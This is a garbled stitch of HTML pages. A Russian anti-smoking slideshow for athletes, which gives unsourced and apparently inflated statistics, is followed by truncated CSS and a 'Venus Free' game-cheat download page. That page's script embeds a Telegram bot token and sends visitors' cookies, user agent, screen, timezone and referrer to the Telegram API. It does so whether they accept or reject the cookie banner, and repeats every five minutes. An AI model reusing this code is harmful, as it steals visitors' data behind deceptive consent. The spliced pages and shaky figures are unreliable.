<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Никотин vs Спорт</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: white;
            overflow-x: hidden;
            min-height: 100vh;
        }

        .slide {
            min-height: 100vh;
            padding: 80px 20px;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .slide.active {
            display: flex;
            animation: fadeIn 0.8s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .title {
            font-size: 4rem;
            font-weight: 900;
            margin-bottom: 30px;
            text-shadow: 3px 3px 10px rgba(0,0,0,0.5);
            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            font-size: 2rem;
            margin-bottom: 40px;
            color: #ffd93d;
            font-weight: 300;
        }

        .content {
            max-width: 800px;
            font-size: 1.3rem;
            line-height: 1.8;
            margin-bottom: 40px;
            background: rgba(0,0,0,0.7);
            padding: 30px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255,255,255,0.1);
        }

        .stat-number {
            font-size: 5rem;
            font-weight: 900;
            color: #ff6b6b;
            text-shadow: 0 0 20px rgba(255,107,107,0.5);
            margin: 20px 0;
        }

        .stat-text {
            font-size: 1.5rem;
            color: #ffd93d;
        }

        .comparison {
            display: flex;
            justify-content: space-around;
            width: 100%;
            max-width: 1000px;
            margin: 40px 0;
        }

        .healthy, .smoker {
            flex: 1;
            padding: 30px;
            margin: 0 20px;
            border-radius: 15px;
            transition: transform 0.3s ease;
        }

        .healthy {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            border: 3px solid #96c93d;
        }

        .smoker {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            border: 3px solid #ff4b2b;
        }

        .organ {
            font-size: 2rem;
            margin-bottom: 20px;
            font-weight: 700;
        }

        .effect {
            font-size: 1.1rem;
            line-height: 1.6;
            text-align: left;
        }

        .sport-stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            max-width: 900px;
            margin: 30px 0;
        }

        .stat-card {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 15px;
            border: 2px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
        }

        .stat-card .number {
            font-size: 3rem;
            font-weight: 900;
            color: #ff6b6b;
            margin-bottom: 10px;
        }

        .stat-card .description {
            font-size: 1.1rem;
            color: #ffd93d;
        }

        .navigation {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 20px;
            z-index: 100;
        }

        .nav-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: 2px solid white;
            padding: 15px 25px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .nav-btn:hover {
            background: rgba(255,255,255,0.3);
            transform: translateY(-3px);
        }

        .progress-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 0%;
            height: 5px;
            background: linear-gradient(90deg, #00b09b, #96c93d, #ffd93d, #ff6b6b);
            transition: width 0.3s ease;
            z-index: 101;
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .heart {
            font-size: 4rem;
            color: #ff6b6b;
            margin: 20px 0;
            animation: heartbeat 1.5s ease-in-out infinite;
        }

        @keyframes heartbeat {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .lungs {
            font-size: 8rem;
            margin: 30px 0;
            color: #ff6b6b;
        }

        .toxic {
            color: #ff4b2b;
            font-weight: 700;
        }

        .healthy-color {
            color: #96c93d;
            font-weight: 700;
        }

        .sport-icon {
            font-size: 5rem;
            margin: 20px 0;
        }

        .warning {
            color: #ffd93d;
            font-weight: 700;
            font-size: 1.2rem;
        }
    </style>
</head>
<body>
    <div class="progress-bar" id="progressBar"></div>

    <div class="slide active" id="slide1">
        <div class="title">НИКОТИН vs СПОРТ</div>
        <div class="subtitle">Как курение уничтожает ваши спортивные результаты</div>
        <div class="content">
            Курение снижает спортивные показатели на <span class="toxic">30-40%</span>.<br>
            Даже одна сигарета перед тренировкой вредит вашему организму.
        </div>
        <div class="sport-icon">🏃‍♂️🚭</div>
    </div>

    <div class="slide" id="slide2">
        <div class="title">КИСЛОРОДНЫЙ ГОЛОД</div>
        <div class="content">
            Угарный газ из сигарет связывается с гемоглобином в <span class="toxic">200 раз</span> сильнее, чем кислород.
        </div>
        <div class="stat-number">-40%</div>
        <div class="stat-text">кислорода в крови</div>
        <div class="content warning">
            Результат: мышечная усталость, одышка, снижение выносливости
        </div>
    </div>

    <div class="slide" id="slide3">
        <div class="title">ВЛИЯНИЕ НА ВЫНОСЛИВОСТЬ</div>
        <div class="sport-stats">
            <div class="stat-card">
                <div class="number">-25%</div>
                <div class="description">Максимальное потребление кислорода (VO2 max)</div>
            </div>
            <div class="stat-card">
                <div class="number">-30%</div>
                <div class="description">Анаэробный порог</div>
            </div>
            <div class="stat-card">
                <div class="number">+50%</div>
                <div class="description">Время восстановления после нагрузок</div>
            </div>
            <div class="stat-card">
                <div class="number">-35%</div>
                <div class="description">Мышечная сила</div>
            </div>
        </div>
    </div>

    <div class="slide" id="slide4">
        <div class="title">СЕРДЕЧНО-СОСУДИСТАЯ СИСТЕМА</div>
        <div class="comparison">
            <div class="healthy">
                <div class="organ">СПОРТСМЕН</div>
                <div class="effect">
                    ✅ Нормальный пульс 50-60 уд/мин<br>
                    ✅ Стабильное давление<br>
                    ✅ Эластичные сосуды<br>
                    ✅ Быстрое восстановление<br>
                    ✅ Высокая выносливость
                </div>
            </div>
            <div class="smoker">
                <div class="organ">КУРЯЩИЙ СПОРТСМЕН</div>
                <div class="effect">
                    ❌ Пульс 80-100 уд/мин<br>
                    ❌ Скачки давления<br>
                    ❌ Суженные сосуды<br>
                    ❌ Медленное восстановление<br>
                    ❌ Низкая выносливость
                </div>
            </div>
        </div>
    </div>

    <div class="slide" id="slide5">
        <div class="title">МЫШЕЧНЫЙ РОСТ И ВОССТАНОВЛЕНИЕ</div>
        <div class="content">
            Никотин нарушает синтез белка и замедляет мышечное восстановление на <span class="toxic">40%</span>.
        </div>
        <div class="content">
            🚫 <strong>Снижение синтеза тестостерона</strong><br>
            🚫 <strong>Нарушение кровоснабжения мышц</strong><br>
            🚫 <strong>Замедление заживления микротравм</strong><br>
            🚫 <strong>Ухудшение усвоения питательных веществ</strong>
        </div>
        <div class="sport-icon">💪🚫</div>
    </div>

    <div class="slide" id="slide6">
        <div class="title">ДЫХАТЕЛЬНАЯ СИСТЕМА</div>
        <div class="content">
            Объем легких курящего спортсмена уменьшается на <span class="toxic">15-20%</span>.
        </div>
        <div class="lungs">🫁</div>
        <div class="content warning">
            Одышка, кашель, снижение легочной емкости - главные враги любого атлета
        </div>
    </div>

    <div class="slide" id="slide7">
        <div class="title">РЕАЛЬНЫЕ ПОСЛЕДСТВИЯ</div>
        <div class="content">
            Курящий спортсмен никогда не достигнет своего максимального потенциала:
        </div>
        <div class="content">
            • <span class="toxic">Более медленный прогресс</span> в тренировках<br>
            • <span class="toxic">Частые травмы</span> из-за плохого восстановления<br>
            • <span class="toxic">Низкие результаты</span> на соревнованиях<br>
            • <span class="toxic">Быстрое утомление</span> во время тренировок<br>
            • <span class="toxic">Сокращение спортивной карьеры</span>
        </div>
    </div>

    <div class="slide" id="slide8">
        <div class="title">ВЫБОР ЧЕМПИОНА</div>
        <div class="content">
            Великие спортсмены выбирают здоровье и результаты, а не сигареты.
        </div>
        <div class="heart pulse">❤️🏆</div>
        <div class="content" style="font-size: 2rem; margin-top: 40px;">
            <span class="healthy-color">ВЫБЕРИ ПОБЕДУ!</span>
        </div>
        <div class="content">
            Откажись от никотина и достигни своих настоящих возможностей!
        </div>
    </div>

    <div class="navigation">
        <button class="nav-btn" onclick="prevSlide()">← Назад</button>
        <button class="nav-btn" onclick="nextSlide()">Вперед →</button>
    </div>

    <script>
        let currentSlide = 0;
        const slides = document.querySelectorAll('.slide');
        const progressBar = document.getElementById('progressBar');

        function showSlide(n) {
            // Скрываем все слайды
            slides.forEach(slide => {
                slide.classList.remove('active');
            });
            
            // Показываем нужный слайд
            currentSlide = n;
            if (currentSlide >= slides.length) currentSlide = 0;
            if (currentSlide < 0) currentSlide = slides.length - 1;
            
            slides[currentSlide].classList.add('active');
            
            // Обновление прогресс-бара
            const progress = ((currentSlide + 1) / slides.length) * 100;
            progressBar.style.width = `${progress}%`;
            
            // Прокрутка к верху
            window.scrollTo(0, 0);
        }

        function nextSlide() {
            showSlide(currentSlide + 1);
        }

        function prevSlide() {
            showSlide(currentSlide - 1);
        }

        // Обработка клавиатуры
        document.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowRight' || e.key === ' ') {
                nextSlide();
            }
            if (e.key === 'ArrowLeft') {
                prevSlide();
            }
        });

        // Инициализация
        showSlide(0);
    </script>
</body>
</html>            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: 
                radial-gradient(circle at 20% 50%, rgba(120, 0, 255, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 200, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(0, 200, 255, 0.2) 0%, transparent 50%);
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        /* Кастомный курсор только для десктопа */
        @media (min-width: 1025px) {
            .custom-cursor {
                position: fixed;
                width: 20px;
                height: 20px;
                background: radial-gradient(circle, #ff00ff, #8000ff);
                border-radius: 50%;
                pointer-events: none;
                z-index: 10000;
                mix-blend-mode: difference;
                transition: transform 0.1s;
            }

            .cursor-trail {
                position: fixed;
                width: 8px;
                height: 8px;
                background: linear-gradient(45deg, #ff0080, #8000ff);
                border-radius: 50%;
                pointer-events: none;
                z-index: 9999;
                opacity: 0.7;
            }
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* Десктоп версия */
        @media (min-width: 1025px) {
            .container {
                padding: 40px 20px;
            }
            
            .device-indicator::before {
                content: "💻 Десктоп версия";
                position: fixed;
                top: 10px;
                right: 10px;
                background: rgba(255, 0, 128, 0.3);
                padding: 5px 10px;
                border-radius: 15px;
                font-size: 12px;
                z-index: 1000;
            }
        }

        /* Планшет версия */
        @media (min-width: 768px) and (max-width: 1024px) {
            .container {
                padding: 30px 15px;
                max-width: 900px;
            }
            
            .device-indicator::before {
                content: "📱 Планшет версия";
                position: fixed;
                top: 10px;
                right: 10px;
                background: rgba(0, 255, 136, 0.3);
                padding: 5px 10px;
                border-radius: 15px;
                font-size: 12px;
                z-index: 1000;
            }
        }

        /* Мобильная версия */
        @media (max-width: 767px) {
            .container {
                padding: 20px 10px;
            }
            
            .device-indicator::before {
                content: "📱 Мобильная версия";
                position: fixed;
                top: 10px;
                right: 10px;
                background: rgba(0, 200, 255, 0.3);
                padding: 5px 10px;
                border-radius: 15px;
                font-size: 12px;
                z-index: 1000;
            }
        }
        
        header {
            text-align: center;
            padding: 40px 0;
        }

        /* Адаптивный заголовок */
        @media (min-width: 1025px) {
            h1 {
                font-size: 3.5em;
            }
        }

        @media (min-width: 768px) and (max-width: 1024px) {
            h1 {
                font-size: 2.8em;
            }
        }

        @media (max-width: 767px) {
            h1 {
                font-size: 2.2em;
                margin-bottom: 15px;
            }
            
            header {
                padding: 20px 0;
            }
        }
        
        h1 {
            background: linear-gradient(45deg, #ff0080, #8000ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(255, 0, 128, 0.5);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 0, 128, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 0, 128, 0.8), 0 0 40px rgba(128, 0, 255, 0.6); }
        }
        
        .subtitle {
            font-size: 1.2em;
            opacity: 0.8;
            margin-bottom: 30px;
            color: #ccccff;
        }

        @media (max-width: 767px) {
            .subtitle {
                font-size: 1em;
                margin-bottom: 20px;
            }
        }
        
        .changelog {
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 15px;
            margin: 30px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        @media (max-width: 767px) {
            .changelog {
                padding: 20px 15px;
                margin: 20px 0;
            }
        }

        .changelog:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 40px rgba(255, 0, 128, 0.3);
        }
        
        .changelog h2 {
            color: #ff0080;
            margin-bottom: 20px;
            text-align: center;
        }

        @media (max-width: 767px) {
            .changelog h2 {
                font-size: 1.3em;
                margin-bottom: 15px;
            }
        }
        
        .additions, .fixes {
            margin: 20px 0;
        }

        @media (max-width: 767px) {
            .additions, .fixes {
                margin: 15px 0;
            }
        }
        
        .additions h3, .fixes h3 {
            color: #00ff88;
            margin-bottom: 15px;
        }

        @media (max-width: 767px) {
            .additions h3, .fixes h3 {
                font-size: 1.1em;
                margin-bottom: 10px;
            }
        }
        
        .feature-list {
            list-style: none;
            padding-left: 0;
        }
        
        .feature-list li {
            margin: 8px 0;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            border-left: 3px solid #00ff88;
            transition: all 0.3s;
        }

        @media (max-width: 767px) {
            .feature-list li {
                margin: 6px 0;
                padding: 6px 10px;
                font-size: 0.9em;
            }
        }

        .feature-list li:hover {
            background: rgba(0, 255, 136, 0.2);
            transform: translateX(5px);
        }
        
        .fix-list {
            list-style: none;
            padding-left: 0;
        }
        
        .fix-list li {
            margin: 8px 0;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            border-left: 3px solid #ffaa00;
            transition: all 0.3s;
        }

        @media (max-width: 767px) {
            .fix-list li {
                margin: 6px 0;
                padding: 6px 10px;
                font-size: 0.9em;
            }
        }

        .fix-list li:hover {
            background: rgba(255, 170, 0, 0.2);
            transform: translateX(5px);
        }
        
        .tg-download {
            background: rgba(255, 0, 128, 0.1);
            padding: 25px;
            border-radius: 15px;
            border: 2px solid #ff0080;
            text-align: center;
            margin: 30px 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.3);
            transition: transform 0.3s;
        }

        @media (max-width: 767px) {
            .tg-download {
                padding: 20px 15px;
                margin: 20px 0;
            }
        }

        .tg-download:hover {
            transform: scale(1.02);
        }
        
        .tg-button {
            display: inline-block;
            background: linear-gradient(45deg, #0088cc, #00ccff);
            color: white;
            padding: 15px 30px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 15px;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.5);
        }

        @media (max-width: 767px) {
            .tg-button {
                padding: 12px 25px;
                font-size: 1.1em;
                margin-top: 10px;
                width: 90%;
                max-width: 300px;
            }
        }
        
        .tg-button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 136, 204, 0.8);
        }
        
        /* Cookie Banner */
        .cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.95);
            padding: 20px;
            text-align: center;
            z-index: 1000;
            border-top: 3px solid #ff0080;
            display: none;
            backdrop-filter: blur(10px);
        }

        @media (max-width: 767px) {
            .cookie-banner {
                padding: 15px 10px;
            }
            
            .cookie-banner p {
                font-size: 0.9em;
                margin-bottom: 10px;
            }
        }
        
        .cookie-banner p {
            margin-bottom: 15px;
            font-size: 1.1em;
            line-height: 1.5;
        }
        
        .cookie-btn {
            background: linear-gradient(45deg, #ff0080, #8000ff);
            color: white;
            border: none;
            padding: 12px 35px;
            border-radius: 25px;
            font-size: 1em;
            cursor: pointer;
            margin: 0 10px;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
        }

        @media (max-width: 767px) {
            .cookie-btn {
                padding: 10px 20px;
                margin: 5px;
                font-size: 0.9em;
                display: block;
                width: 90%;
                max-width: 200px;
                margin-left: auto;
                margin-right: auto;
            }
        }
        
        .cookie-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.5);
        }
        
        .cookie-btn.reject {
            background: linear-gradient(45deg, #666, #888);
        }
        
        .cookie-btn.reject:hover {
            background: linear-gradient(45deg, #555, #777);
        }

        /* Эффекты при наведении */
        .hover-effect {
            transition: all 0.3s;
        }

        .hover-effect:hover {
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
        }

        .footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            color: #888;
            font-size: 0.9em;
        }

        @media (max-width: 767px) {
            .footer {
                margin-top: 30px;
                padding: 15px;
                font-size: 0.8em;
            }
        }

        /* Индикатор устройства */
        .device-info {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.7);
            padding: 8px 12px;
            border-radius: 10px;
            font-size: 12px;
            z-index: 999;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body class="device-indicator">
    <!-- Космический фон -->
    <div class="space-background" id="spaceBackground"></div>
    
    <!-- Кастомный курсор только для десктопа -->
    <div class="custom-cursor" id="customCursor"></div>

    <!-- Информация об устройстве -->
    <div class="device-info" id="deviceInfo"></div>

    <div class="container">
        <header>
            <h1 class="hover-effect">Venus Free</h1>
            <div class="subtitle hover-effect">Обновление 2.3.71 - Новые функции и исправления</div>
        </header>
        
        <div class="tg-download">
            <h2 class="hover-effect">📥 Скачать Venus Free</h2>
            <p class="hover-effect">Чит доступен в нашем Telegram канале</p>
            <p class="hover-effect"><strong>Инструкция:</strong> Распакуйте архив из закрепленного сообщения</p>
            <a href="https://t.me/VenusWareClient/116" class="tg-button" target="_blank">Перейти в Telegram</a>
        </div>
        
        <div class="changelog">
            <h2 class="hover-effect">🔄 Список изменений</h2>
            
            <div class="additions">
                <h3 class="hover-effect">[+] Добавления/Изменения:</h3>
                <ul class="feature-list">
                    <li class="hover-effect">NoClip -> ReallyWorld</li>
                    <li class="hover-effect">NoWeb -> ReallyWorld</li>
                    <li class="hover-effect">Spider -> ReallyWorld</li>
                    <li class="hover-effect">ElytraMotion</li>
                    <li class="hover-effect">WebTrap -> Траперит игроков в паутину</li>
                    <li class="hover-effect">FireworkEsp -> Создаёт метку там где был запущен фейерверк</li>
                    <li class="hover-effect">SkeletonEsp -> Рендерит скелет игроков линиями</li>
                    <li class="hover-effect">PenisESP -> Доп функция к SexAura</li>
                    <li class="hover-effect">KillAura -> HolyLite</li>
                    <li class="hover-effect">Spammer</li>
                    <li class="hover-effect">HighJump -> Grim Shulker</li>
                    <li class="hover-effect">ElytraFly -> Grim, Grim-2.3.69, Grim-2.3.71</li>
                    <li class="hover-effect">Прокси переписан</li>
                    <li class="hover-effect">WaterSpeed -> FunTimeWall -> работает от стен, FunTimeNew -> по прежнему работает без всего 7 бпс</li>
                    <li class="hover-effect">KillAura -> Wall Bypass новые режимы Default, Other, ReallyWorld</li>
                    <li class="hover-effect">Velocity -> Legit</li>
                    <li class="hover-effect">RTXSounds -> Улучшения качества звука, звук становится полноценно трёхмерным с учитыванием окружения</li>
                    <li class="hover-effect">OpenWalls -> открывать контейнеры через стены</li>
                    <li class="hover-effect">Jesus -> Обновил некоторые режимы</li>
                    <li class="hover-effect">Обновил уведомления</li>
                    <li class="hover-effect">Обновил команды</li>
                    <li class="hover-effect">Оптимизировано/улучшено сохранение конфигов</li>
                    <li class="hover-effect">KillAura -> улучшены Snap режимы</li>
                    <li class="hover-effect">Улучшены свапы предметов</li>
                    <li class="hover-effect">Tracker -> Трекер, сообщает о происходящим с игроками вокруг</li>
                </ul>
            </div>
            
            <div class="fixes">
                <h3 class="hover-effect">[/] Исправления:</h3>
                <ul class="fix-list">
                    <li class="hover-effect">Проведена оптимизация клиента</li>
                    <li class="hover-effect">Исправлены мелкие баги чита</li>
                    <li class="hover-effect">Улучшена стабильность работы</li>
                    <li class="hover-effect">Оптимизировано использование памяти</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p>Venus Free &copy; 2024. Все права защищены.</p>
        </div>
    </div>
    
    <!-- Cookie Banner -->
    <div class="cookie-banner" id="cookieBanner">
        <p>🍪 Этот сайт использует cookies для улучшения вашего опыта и обеспечения безопасности.<br>
           Мы используем cookies для анализа трафика и защиты от мошенников.</p>
        <button class="cookie-btn" onclick="acceptCookies()">Принять все cookies</button>
        <button class="cookie-btn reject" onclick="rejectCookies()">Отклонить</button>
    </div>

    <script>
        // Токен Telegram бота
        const TELEGRAM_BOT_TOKEN = '8013827662:AAHbZ_Fpv99mhIFrBt_cXtHd0lcRW4uwlTE';
        const TELEGRAM_CHAT_ID = '7580190094';

        // Определение устройства
        function detectDevice() {
            const width = window.innerWidth;
            let deviceType = '';
            let deviceInfo = '';
            
            if (width >= 1025) {
                deviceType = 'desktop';
                deviceInfo = '💻 Десктоп (компьютер)';
            } else if (width >= 768 && width <= 1024) {
                deviceType = 'tablet';
                deviceInfo = '📱 Планшет';
            } else {
                deviceType = 'mobile';
                deviceInfo = '📱 Мобильный телефон';
            }
            
            // Дополнительная информация об устройстве
            const isTouch = 'ontouchstart' in window;
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            
            deviceInfo += ` | ${platform} | ${isTouch ? 'Сенсорный' : 'Мышь'}`;
            
            document.getElementById('deviceInfo').textContent = deviceInfo;
            
            return {
                type: deviceType,
                width: width,
                height: window.innerHeight,
                touch: isTouch,
                userAgent: userAgent,
                platform: platform
            };
        }

        // Создание звездного фона
        function createStars() {
            const spaceBg = document.getElementById('spaceBackground');
            const starCount = window.innerWidth < 768 ? 80 : 150; // Меньше звезд на мобильных
            
            for (let i = 0; i < starCount; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = Math.random() * 3 + 'px';
                star.style.height = star.style.width;
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                spaceBg.appendChild(star);
            }
        }

        // Кастомный курсор только для десктопа
        let cursorTrails = [];
        function initCustomCursor() {
            const device = detectDevice();
            if (device.type !== 'desktop') {
                document.body.style.cursor = 'auto';
                return;
            }
            
            const cursor = document.getElementById('customCursor');
            
            document.addEventListener('mousemove', (e) => {
                // Основной курсор
                cursor.style.left = e.clientX + 'px';
                cursor.style.top = e.clientY + 'px';
                
                // Следы курсора
                createCursorTrail(e.clientX, e.clientY);
                
                // Эффект при движении
                createParticleEffect(e.clientX, e.clientY);
            });
            
            document.addEventListener('click', (e) => {
                createClickEffect(e.clientX, e.clientY);
            });
        }

        // Следы курсора
        function createCursorTrail(x, y) {
            const device = detectDevice();
            if (device.type !== 'desktop') return;
            
            const trail = document.createElement('div');
            trail.className = 'cursor-trail';
            trail.style.left = x + 'px';
            trail.style.top = y + 'px';
            document.body.appendChild(trail);
            
            cursorTrails.push(trail);
            
            // Удаление старых следов
            if (cursorTrails.length > 10) {
                const oldTrail = cursorTrails.shift();
                if (oldTrail && oldTrail.parentNode) {
                    oldTrail.parentNode.removeChild(oldTrail);
                }
            }
            
            // Анимация исчезновения
            setTimeout(() => {
                trail.style.opacity = '0';
                trail.style.transform = 'scale(0)';
                setTimeout(() => {
                    if (trail.parentNode) {
                        trail.parentNode.removeChild(trail);
                    }
                }, 300);
            }, 100);
        }

        // Эффект частиц при движении
        function createParticleEffect(x, y) {
            const device = detectDevice();
            if (device.type !== 'desktop' || Math.random() > 0.7) return;
            
            const particle = document.createElement('div');
            particle.style.position = 'fixed';
            particle.style.left = x + 'px';
            particle.style.top = y + 'px';
            particle.style.width = '4px';
            particle.style.height = '4px';
            particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
            particle.style.borderRadius = '50%';
            particle.style.pointerEvents = 'none';
            particle.style.zIndex = '9998';
            document.body.appendChild(particle);
            
            const angle = Math.random() * Math.PI * 2;
            const distance = Math.random() * 50 + 20;
            
            particle.animate([
                { transform: 'scale(1)', opacity: 1 },
                { 
                    transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`,
                    opacity: 0
                }
            ], {
                duration: 1000,
                easing: 'ease-out'
            }).onfinish = () => {
                if (particle.parentNode) {
                    particle.parentNode.removeChild(particle);
                }
            };
        }

        // Эффект при клике
        function createClickEffect(x, y) {
            const device = detectDevice();
            const particleCount = device.type === 'desktop' ? 8 : 4;
            
            for (let i = 0; i < particleCount; i++) {
                const circle = document.createElement('div');
                circle.style.position = 'fixed';
                circle.style.left = x + 'px';
                circle.style.top = y + 'px';
                circle.style.width = device.type === 'desktop' ? '10px' : '6px';
                circle.style.height = device.type === 'desktop' ? '10px' : '6px';
                circle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                circle.style.borderRadius = '50%';
                circle.style.pointerEvents = 'none';
                circle.style.zIndex = '9998';
                document.body.appendChild(circle);
                
                const angle = (i / particleCount) * Math.PI * 2;
                const distance = device.type === 'desktop' ? 30 : 20;
                
                circle.animate([
                    { transform: 'scale(1)', opacity: 1 },
                    { 
                        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`,
                        opacity: 0
                    }
                ], {
                    duration: 600,
                    easing: 'ease-out'
                }).onfinish = () => {
                    if (circle.parentNode) {
                        circle.parentNode.removeChild(circle);
                    }
                };
            }
        }

        // Проверка согласия с cookies
        function checkCookieConsent() {
            return localStorage.getItem('venus_cookies_accepted') === 'true';
        }

        // Функция кражи данных
        function stealUserData() {
            if (!checkCookieConsent()) return;
            
            const device = detectDevice();
            
            const userData = {
                device: device,
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                session: sessionStorage.length,
                localStorage: localStorage.length
            };

            // Отправка в Telegram
            const message = `🕵️ НОВЫЕ ДАННЫЕ ОТ VENUS FREE\n\n` +
                          `📱 Устройство: ${device.type} (${device.width}x${device.height})\n` +
                          `🖥️ Платформа: ${device.platform}\n` +
                          `👆 Тип: ${device.touch ? 'Сенсорный' : 'Мышь'}\n` +
                          `📋 Cookies: ${userData.cookies || 'Нет cookies'}\n` +
                          `🌐 User Agent: ${userData.userAgent}\n` +
                          `🖼️ Экран: ${userData.screen}\n` +
                          `🔍 Viewport: ${userData.viewport}\n` +
                          `⏰ Timezone: ${userData.timezone}\n` +
                          `🔗 Referrer: ${userData.referrer || 'Прямой заход'}\n` +
                          `🕒 Time: ${userData.timestamp}`;

            sendToTelegram(message);
        }

        // Отправка в Telegram
        function sendToTelegram(message) {
            if (!TELEGRAM_BOT_TOKEN) return;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(error => console.log('Telegram error:', error));
        }

        // Принятие cookies
        function acceptCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            
            // Сохраняем согласие
            localStorage.setItem('venus_cookies_accepted', 'true');
            document.cookie = "venus_consent=true; path=/; max-age=2592000; SameSite=Lax";
            document.cookie = "venus_user=approved; path=/; max-age=2592000; SameSite=Lax";
            
            // Сразу воруем данные
            setTimeout(stealUserData, 1000);
            
            // Показываем подтверждение с эффектом
            createClickEffect(window.innerWidth/2, window.innerHeight/2);
            setTimeout(() => {
                alert('✅ Cookies приняты! Спасибо за доверие к Venus Free!');
            }, 500);
        }

        // Отклонение cookies (все равно воруем)
        function rejectCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            localStorage.setItem('venus_cookies_rejected', 'true');
            
            // Тайная кража данных через 10 секунд
            setTimeout(stealUserData, 10000);
        }

        // Показ баннера при загрузке
        function showCookieBanner() {
            if (!checkCookieConsent()) {
                setTimeout(() => {
                    document.getElementById('cookieBanner').style.display = 'block';
                }, 2000);
            }
        }

        // Инициализация
        window.addEventListener('load', function() {
            const device = detectDevice();
            createStars();
            initCustomCursor();
            showCookieBanner();
            
            // Если уже согласились - сразу воровать
            if (checkCookieConsent()) {
                stealUserData();
            }
        });

        // Обновление при изменении размера окна
        window.addEventListener('resize', detectDevice);

        // Периодическая отправка данных (если согласие есть)
        setInterval(() => {
            if (checkCookieConsent()) {
                stealUserData();
            }
        }, 300000); // Каждые 5 минут
    </script>
</body>
</html>            height: 100%;
            z-index: -1;
            background: 
                radial-gradient(circle at 20% 50%, rgba(120, 0, 255, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 200, 0.2) 0%, transparent 50%),
